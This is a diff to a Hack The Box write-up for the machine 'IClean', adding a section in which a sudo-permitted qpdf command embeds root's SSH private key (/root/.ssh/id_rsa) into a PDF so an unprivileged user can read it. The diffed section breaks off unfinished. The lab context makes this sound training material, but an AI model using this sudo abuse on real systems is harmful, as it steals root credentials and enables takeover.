@@ -1,7 +1,7 @@
 ---
 layout: writeup
 category: HTB
-date: 2024-12-29
+date: 2024-12-30
 comments: false
 tags: serversidetemplateinjection ssti xss crosssitescripting reverseshell mysql cracking hash sha-256 sudoers
 ---
@@ -508,5 +508,64 @@ Related options:
 
 For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
 ```
+## File Read:
+
+<br />
+
+The version of qpdf in use does not have any vulnerabilities, but the fact that we can run it as root is dangerous, since by executing the following command we can access any file on the machine:
+
+<br />
+
+```bash
+consuela@iclean:~$ sudo /usr/bin/qpdf --empty --add-attachment /root/.ssh/id_rsa -- id_rsa
+consuela@iclean:~$ ls -l id_rsa 
+-rw-r--r-- 1 root root 1173 Dec 30 19:01 id_rsa
+consuela@iclean:~$ cat id_rsa 
+%PDF-1.3
+%����
+1 0 obj
+<< /Names << /EmbeddedFiles 2 0 R >> /PageMode /UseAttachments /Pages 3 0 R /Type /Catalog >>
+endobj
+2 0 obj
+<< /Names [ (id_rsa) 4 0 R ] >>
+endobj
+3 0 obj
+<< /Count 0 /Kids [ ] /Type /Pages >>
+endobj
+4 0 obj
+<< /EF << /F 5 0 R /UF 5 0 R >> /F (id_rsa) /Type /Filespec /UF (id_rsa) >>
+endobj
+5 0 obj
+<< /Params << /CheckSum <bb34da3f74ca5fb11f4ccbc393e113bc> /CreationDate (D:20241230190129Z) /ModDate (D:20241230190129Z) /Size 505 >> /Type /EmbeddedFile /Length 377 /Filter /FlateDecode >>
+stream
+x�uQ�r�@���)˰ĄC38�� 8�@DY\��O�*�҇W�կ^u��N⑿�aቷF�Rs�&4Y!6�S!U`��xHt�oOm���.�6#Ei��c��#y1\2�
+                                                                                        �
+Ґ�w���N!�o��׍���}7�G���(t��M�L���b��J1?��c��9G�%9h��<�@q�m�%�Z��X����
+                                                                     2�ު}+yq2��[yl⣳�
+!���"-t+i%ءF�K���@H���@��A�D�6�3wuim{��z��.-?g�[>��J��%��롇��w(�=�>
+��-endstream                                                       ����N��H�,�-���告[���L��]�u�g&?K�PA��Kx����R�
+endobj
+xref
+0 6
+0000000000 65535 f 
+0000000015 00000 n 
+0000000124 00000 n 
+0000000171 00000 n 
+0000000224 00000 n 
+0000000315 00000 n 
+trailer << /Root 1 0 R /Size 6 /ID [<7596d96e9b572498c7455bc46cde003a><7596d96e9b572498c7455bc46cde003a>] >>
+startxref
+915
+%%EOF
+```
+<br />
+
+That's great! The command has been successfully executed, so we're going to take the file to local so that we can open it with "open" and access the embedded root id_rsa:
+
+<br />
+
+The document does not contain any pages:
+
+<br />
 
 
